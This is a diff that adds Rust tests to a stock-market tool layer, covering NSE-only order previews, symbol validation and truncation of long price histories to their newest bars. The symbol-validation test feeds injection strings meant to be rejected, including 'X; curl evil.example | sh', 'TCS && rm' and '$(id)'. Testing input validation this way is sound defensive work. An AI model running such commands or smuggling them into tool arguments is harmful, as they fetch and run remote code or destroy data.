@@ -1,6 +1,7 @@
 //! Tool layer tests: schemas, argument checks, size limits, and handlers
 //! against fixtures (no network).
 
+use super::handlers;
 use super::*;
 use crate::alerts::AlertStore;
 use crate::api::{ChartData, Quote, SearchResult};
@@ -571,4 +572,79 @@ fn claude_desktop_extension_lists_every_tool() {
     assert_eq!(listed, tools, "update packaging/mcpb/manifest.json");
     let market = m["user_config"]["market"]["default"].as_str().unwrap();
     assert!(market_codes().iter().any(|c| c == market));
+}
+
+#[tokio::test]
+async fn order_preview_is_nse_only_and_checks_the_symbol() {
+    // A US default market doesn't stop an NSE preview.
+    let mut c = ToolContext::new(LongCharts::default(), Market::Us);
+    c.allow_orders = true;
+    let v = c
+        .call(
+            "order_preview",
+            &json!({"side": "buy", "symbol": "tcs", "quantity": 1, "broker": "angel"}),
+        )
+        .await
+        .unwrap();
+    assert_eq!(v["data"]["symbol"], "TCS");
+    assert_eq!(v["data"]["last_price"], 4100.0);
+    // Anything that could do more than name a stock in a shell command.
+    for bad in ["X; curl evil.example | sh", "TCS && rm", "$(id)", "TCS`x`"] {
+        let r = c
+            .call(
+                "order_preview",
+                &json!({"side": "sell", "symbol": bad, "quantity": 1, "broker": "angel"}),
+            )
+            .await;
+        assert!(r.is_err(), "{bad} was accepted");
+    }
+    let e = c
+        .call(
+            "order_preview",
+            &json!({"side": "sell", "symbol": "TCS && rm", "quantity": 1, "broker": "angel"}),
+        )
+        .await
+        .unwrap_err();
+    assert!(e.to_string().contains("not an NSE symbol"), "{e}");
+    let e = c
+        .call(
+            "order_preview",
+            &json!({"side": "buy", "symbol": "NOPE", "quantity": 1, "broker": "angel"}),
+        )
+        .await
+        .unwrap_err();
+    assert!(e.to_string().contains("No NSE quote for NOPE.NS"), "{e}");
+}
+
+#[test]
+fn newest_within_keeps_the_latest_items() {
+    let items: Vec<u32> = (0..100).collect();
+    let kept = handlers::newest_within(&items, 40);
+    assert!(!kept.is_empty() && kept.len() < 100);
+    assert_eq!(*kept.last().unwrap(), 99);
+    assert!(serde_json::to_string(kept).unwrap().len() <= 40);
+    assert_eq!(handlers::newest_within(&items, 10_000).len(), 100);
+}
+
+#[tokio::test]
+async fn long_histories_keep_their_newest_bars() {
+    let mut c = ctx();
+    c.max_result_bytes = 4_000;
+    let v = c
+        .call(
+            "history",
+            &json!({"symbol": "TCS", "period": "1y", "limit": 250}),
+        )
+        .await
+        .unwrap();
+    assert!(serde_json::to_string(&v).unwrap().len() <= 4_000);
+    let d = &v["data"];
+    let bars = d["bars"].as_array().unwrap();
+    assert!(bars.len() < 250 && bars.len() == d["bars_shown"].as_u64().unwrap() as usize);
+    // The last bar of the fixture's 300 daily bars.
+    let newest = chrono::DateTime::from_timestamp(1_700_000_000 + 299 * 86_400, 0)
+        .unwrap()
+        .to_rfc3339();
+    assert_eq!(bars.last().unwrap()["time"], newest);
+    assert_eq!(d["bar_count"], 300);
 }
